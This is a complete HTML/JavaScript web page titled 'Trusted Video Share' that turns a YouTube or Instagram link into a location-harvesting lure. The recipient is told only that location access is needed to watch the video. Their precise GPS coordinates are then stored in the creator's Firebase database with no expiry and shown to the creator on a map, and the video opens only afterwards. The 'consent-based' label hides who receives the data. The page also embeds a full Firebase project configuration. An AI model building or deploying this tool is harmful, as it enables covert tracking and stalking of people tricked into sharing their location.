<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">

  <title>Trusted Video Share</title>

  <style>
    * {
      box-sizing: border-box;
    }

    body {
      margin: 0;
      font-family: system-ui, -apple-system, BlinkMacSystemFont,
        "Segoe UI", Roboto, Arial, sans-serif;
      background: #f3f6fb;
      color: #172033;
    }

    .wrap {
      width: min(92%, 560px);
      margin: 30px auto;
    }

    .card {
      background: #fff;
      padding: 24px;
      border-radius: 18px;
      box-shadow: 0 8px 30px rgba(0, 0, 0, .10);
      margin-bottom: 18px;
    }

    h1,
    h2 {
      margin-top: 0;
    }

    label {
      display: block;
      font-weight: 600;
      margin-bottom: 6px;
    }

    input {
      width: 100%;
      padding: 13px;
      border: 1px solid #d5dbe5;
      border-radius: 10px;
      font-size: 16px;
      margin-bottom: 12px;
    }

    button {
      width: 100%;
      padding: 13px;
      border: 0;
      border-radius: 10px;
      background: #1769e0;
      color: #fff;
      font-size: 16px;
      font-weight: 600;
      cursor: pointer;
      margin-top: 7px;
    }

    button:disabled {
      opacity: .55;
      cursor: not-allowed;
    }

    .secondary {
      background: #333;
    }

    .small {
      font-size: 14px;
      color: #5f6878;
      line-height: 1.5;
    }

    .result {
      background: #edf9f0;
      padding: 14px;
      border-radius: 12px;
      margin-top: 14px;
      word-break: break-word;
    }

    .item {
      background: #f7f8fa;
      padding: 14px;
      border-radius: 12px;
      margin-top: 10px;
      border: 1px solid #e1e4e8;
    }

    a {
      color: #1769e0;
      word-break: break-all;
    }

    .hidden {
      display: none;
    }

    .status {
      margin-top: 12px;
      min-height: 20px;
      font-weight: 500;
    }

    .error-msg {
      color: #a51d2d;
    }

    .success-msg {
      color: #1b7e36;
    }

    .map-button {
      display: block;
      width: 100%;
      text-align: center;
      background: #1769e0;
      color: white;
      padding: 12px;
      border-radius: 10px;
      text-decoration: none;
      font-weight: 600;
      margin-top: 10px;
    }
  </style>
</head>

<body>

  <div class="wrap">

    <!-- ================= CREATOR ================= -->

    <section id="creator" class="card">

      <h1>🎬 Trusted Video Share</h1>

      <p class="small">
        Create a consent-based location-sharing link for a trusted person.
      </p>

      <label for="videoUrl">
        YouTube / Instagram Video URL
      </label>

      <input id="videoUrl" type="url" placeholder="https://www.youtube.com/watch?v=..." autocomplete="off">

      <button id="generate">
        Generate Share Link
      </button>

      <div id="creatorStatus" class="status small"></div>

      <div id="generated" class="result hidden">

        <strong>Share Link Generated:</strong>

        <p id="shareLink" style="font-weight:bold;margin:8px 0"></p>

        <button id="copy" class="secondary">
          Copy Link
        </button>

      </div>

      <h2 style="margin-top:28px">
        📍 Received Locations
      </h2>

      <div id="locations">
        <p class="small">
          No location received yet.
        </p>
      </div>

    </section>


    <!-- ================= TRUSTED PERSON ================= -->

    <section id="trusted" class="card hidden">

      <h1>📍 Location Access</h1>

      <p class="small">
        Location access is required to continue to the video.
      </p>

      <div id="trustedStatus" class="status small">
        Checking share link...
      </div>

    </section>

  </div>


  <script type="module">

    /* =====================================================
       FIREBASE
       ===================================================== */

    import { initializeApp }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

    import {
      getDatabase,
      ref,
      set,
      push,
      get,
      onValue
    }
      from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";


    const firebaseConfig = {

      apiKey:
        "AIzaSyACBBQt47ccBEPuvsDnmQM1JGvhI9w7uaU",

      authDomain:
        "project-fa217679-f9c7-4383-87b.firebaseapp.com",

      databaseURL:
        "https://project-fa217679-f9c7-4383-87b-default-rtdb.firebaseio.com",

      projectId:
        "project-fa217679-f9c7-4383-87b",

      storageBucket:
        "project-fa217679-f9c7-4383-87b.firebasestorage.app",

      messagingSenderId:
        "102609897998",

      appId:
        "1:102609897998:web:87b2ce38b92fcbb71a11cf",

      measurementId:
        "G-h5CG9HXKT4"
    };


    const app =
      initializeApp(firebaseConfig);

    const db =
      getDatabase(app);


    /* =====================================================
       HELPERS
       ===================================================== */

    const $ =
      id => document.getElementById(id);

    const params =
      new URLSearchParams(window.location.search);

    const shareId =
      params.get("share");

    const creator =
      $("creator");

    const trusted =
      $("trusted");


    /* =====================================================
       RANDOM ID
       ===================================================== */

    function randomId() {

      const chars =
        "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";

      let id = "";

      for (let i = 0; i < 12; i++) {

        id +=
          chars[
          Math.floor(
            Math.random() * chars.length
          )
          ];

      }

      return id;
    }


    /* =====================================================
       VIDEO URL VALIDATION
       ===================================================== */

    function validVideoUrl(value) {

      try {

        const url =
          new URL(value);

        return (
          url.protocol === "https:" &&
          /(^|\.)youtube\.com$|(^|\.)youtu\.be$|(^|\.)instagram\.com$/i
            .test(url.hostname)
        );

      } catch {

        return false;

      }
    }


    /* =====================================================
       CREATOR MODE
       ===================================================== */

    if (!shareId) {

      $("generate")
        .addEventListener(
          "click",
          async () => {

            const videoUrl =
              $("videoUrl")
                .value
                .trim();


            if (!validVideoUrl(videoUrl)) {

              $("creatorStatus").className =
                "status small error-msg";

              $("creatorStatus").textContent =
                "Please enter a valid HTTPS YouTube or Instagram URL.";

              return;
            }


            $("generate").disabled =
              true;


            $("creatorStatus").className =
              "status small";

            $("creatorStatus").textContent =
              "Creating share link...";


            const id =
              randomId();


            try {

              /*
               * NO EXPIRY
               */

              const createdAt =
                Date.now();


              await set(
                ref(
                  db,
                  "shares/" + id
                ),
                {
                  videoUrl:
                    videoUrl,

                  createdAt:
                    createdAt,

                  status:
                    "waiting"
                }
              );


              const link =
                window.location.origin +
                window.location.pathname +
                "?share=" +
                encodeURIComponent(id);


              $("shareLink").textContent =
                link;


              $("generated")
                .classList
                .remove("hidden");


              $("creatorStatus").className =
                "status small success-msg";


              $("creatorStatus").textContent =
                "Share link created. No automatic expiry.";


              watchLocations(id);


            } catch (error) {

              console.error(error);

              $("creatorStatus").className =
                "status small error-msg";

              $("creatorStatus").textContent =
                "Could not create share link.";

            } finally {

              $("generate").disabled =
                false;

            }

          }
        );


      /* =====================================================
         COPY
         ===================================================== */

      $("copy")
        .addEventListener(
          "click",
          async () => {

            try {

              await navigator.clipboard.writeText(
                $("shareLink").textContent
              );

              $("copy").textContent =
                "Copied ✓";

              setTimeout(
                () => {
                  $("copy").textContent =
                    "Copy Link";
                },
                1500
              );

            } catch {

              $("creatorStatus").className =
                "status small error-msg";

              $("creatorStatus").textContent =
                "Copy failed. Copy the link manually.";

            }

          }
        );


      /* =====================================================
         REAL-TIME LOCATION
         ===================================================== */

      function watchLocations(id) {

        onValue(
          ref(
            db,
            "locations/" + id
          ),

          snapshot => {

            const root =
              $("locations");

            root.innerHTML =
              "";


            if (!snapshot.exists()) {

              root.innerHTML =
                '<p class="small">No location received yet.</p>';

              return;
            }


            const entries =
              Object.values(
                snapshot.val()
              ).reverse();


            for (const loc of entries) {

              const latitude =
                Number(loc.latitude);

              const longitude =
                Number(loc.longitude);

              const accuracy =
                Number(loc.accuracy);

              const time =
                new Date(
                  loc.timestamp
                ).toLocaleString();


              const mapUrl =
                "https://www.google.com/maps/search/?api=1&query=" +
                encodeURIComponent(
                  `${latitude},${longitude}`
                );


              const box =
                document.createElement("div");


              box.className =
                "item";


              box.innerHTML = `

                <strong style="color:#1769e0">
                  📍 Location Received
                </strong>

                <p class="small">

                  <strong>Latitude:</strong>
                  ${latitude.toFixed(6)}

                  <br>

                  <strong>Longitude:</strong>
                  ${longitude.toFixed(6)}

                  <br>

                  <strong>Accuracy:</strong>
                  ~${Math.round(accuracy)} meters

                  <br>

                  <strong>Time:</strong>
                  ${time}

                </p>

                <a
                  class="map-button"
                  href="${mapUrl}"
                  target="_blank"
                  rel="noopener noreferrer"
                >
                  🗺️ Open Location in Google Maps
                </a>

              `;


              root.appendChild(box);

            }

          }
        );

      }

    }


    /* =====================================================
       TRUSTED PERSON MODE
       ===================================================== */

    if (shareId) {

      creator.classList.add(
        "hidden"
      );

      trusted.classList.remove(
        "hidden"
      );


      let shareData =
        null;


      /* =====================================================
         LOAD SHARE
         ===================================================== */

      async function loadShare() {

        try {

          const snapshot =
            await get(
              ref(
                db,
                "shares/" +
                shareId
              )
            );


          /*
           * Link manually deleted/closed
           */

          if (!snapshot.exists()) {

            $("trustedStatus").className =
              "status small error-msg";

            $("trustedStatus").textContent =
              "This share link is invalid or closed.";

            return;
          }


          shareData =
            snapshot.val();


          $("trustedStatus").className =
            "status small";

          $("trustedStatus").textContent =
            "Requesting location access...";


          /*
           * Start native browser geolocation.
           */

          requestLocation();


        } catch (error) {

          console.error(error);

          $("trustedStatus").className =
            "status small error-msg";

          $("trustedStatus").textContent =
            "Could not load the share link.";

        }

      }


      /* =====================================================
         LOCATION REQUEST
         ===================================================== */

      function requestLocation() {

        if (!shareData) {
          return;
        }


        /*
         * Browser does not support geolocation.
         */

        if (!navigator.geolocation) {

          $("trustedStatus").className =
            "status small error-msg";

          $("trustedStatus").textContent =
            "Location is not supported by this browser.";

          return;
        }


        $("trustedStatus").className =
          "status small";

        $("trustedStatus").textContent =
          "Please allow location access when your device/browser asks.";


        /*
         * IMPORTANT:
         *
         * This is the REAL browser geolocation API.
         *
         * Android/browser controls:
         * - Turn on Location flow
         * - Allow / Deny permission
         *
         * Website cannot bypass those controls.
         */

        navigator.geolocation.getCurrentPosition(

          /* =================================================
             LOCATION SUCCESS
             ================================================= */

          async position => {

            const latitude =
              position.coords.latitude;

            const longitude =
              position.coords.longitude;

            const accuracy =
              position.coords.accuracy;

            const timestamp =
              Date.now();


            const locationData = {

              latitude:
                latitude,

              longitude:
                longitude,

              accuracy:
                accuracy,

              timestamp:
                timestamp
            };


            try {

              $("trustedStatus").textContent =
                "Location received. Saving...";


              /*
               * Save location
               */

              const locationRef =
                push(
                  ref(
                    db,
                    "locations/" +
                    shareId
                  )
                );


              await set(
                locationRef,
                locationData
              );


              /*
               * Update status
               */

              await set(
                ref(
                  db,
                  "shares/" +
                  shareId +
                  "/status"
                ),
                "location_received"
              );


              $("trustedStatus").className =
                "status small success-msg";


              $("trustedStatus").textContent =
                "Location verified. Opening video...";


              /*
               * ONLY AFTER LOCATION IS
               * SUCCESSFULLY SAVED
               * open the original video.
               */

              setTimeout(
                () => {

                  window.location.href =
                    shareData.videoUrl;

                },
                800
              );


            } catch (error) {

              console.error(error);


              /*
               * If Firebase save fails,
               * DO NOT open video.
               */

              $("trustedStatus").className =
                "status small error-msg";

              $("trustedStatus").textContent =
                "Location could not be saved. Video will not open.";

            }

          },


          /* =================================================
             LOCATION ERROR
             ================================================= */

          error => {

            $("trustedStatus").className =
              "status small error-msg";


            /*
             * Permission denied
             */

            if (
              error.code ===
              error.PERMISSION_DENIED
            ) {

              $("trustedStatus").textContent =
                "Location permission was denied. Video will not open.";

              return;
            }


            /*
             * Location/GPS unavailable
             *
             * User should manually turn ON
             * device Location and try again.
             */

            if (
              error.code ===
              error.POSITION_UNAVAILABLE
            ) {

              $("trustedStatus").textContent =
                "Device Location is OFF or unavailable. Please turn ON Location on your device, then reopen the link.";

              return;
            }


            /*
             * Timeout
             */

            if (
              error.code ===
              error.TIMEOUT
            ) {

              $("trustedStatus").textContent =
                "Location request timed out. Please turn ON Location and try again.";

              return;
            }


            $("trustedStatus").textContent =
              "Unable to get your location. Video will not open.";

          },


          /* =================================================
             LOCATION OPTIONS
             ================================================= */

          {

            /*
             * Request best available accuracy.
             */

            enableHighAccuracy:
              true,

            /*
             * Wait up to 30 seconds.
             */

            timeout:
              30000,

            /*
             * Do not use old cached location.
             */

            maximumAge:
              0

          }

        );

      }


      /* =====================================================
         START
         ===================================================== */

      loadShare();

    }

  </script>

</body>

</html>
